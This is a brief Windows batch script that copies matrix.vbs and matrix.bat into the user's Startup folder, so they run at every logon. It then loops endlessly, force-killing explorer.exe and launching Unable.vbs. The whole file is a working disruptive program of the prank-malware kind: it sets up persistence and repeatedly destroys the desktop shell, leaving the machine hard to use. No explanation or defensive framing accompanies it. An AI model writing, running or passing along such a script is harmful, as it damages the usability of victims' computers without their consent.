@echo off
title keepitonn
color 02

copy matrix.vbs "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
copy matrix.bat "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
:a
taskkill /f /im explorer.exe
start Unable.vbs
goto a
